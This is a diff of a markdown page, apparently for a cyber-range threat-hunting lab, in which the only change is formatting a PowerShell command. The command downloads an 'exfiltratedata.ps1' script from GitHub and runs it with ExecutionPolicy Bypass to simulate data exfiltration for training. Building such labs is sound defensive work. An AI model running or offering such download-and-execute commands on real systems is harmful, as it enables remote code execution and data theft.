@@ -3,7 +3,7 @@
 
 ## Steps the "Bad Actor" took Create Logs and IoCs:
 1. Execute the following code in Powershell:
-- Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
+- `Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1`
 
 ## What this script does:
 - `exfiltratedata.ps1` is a PowerShell script designed to simulate data exfiltration for cybersecurity training and testing. It demonstrates how sensitive files might be collected and transmitted by an attacker. Intended for use in controlled environments only.
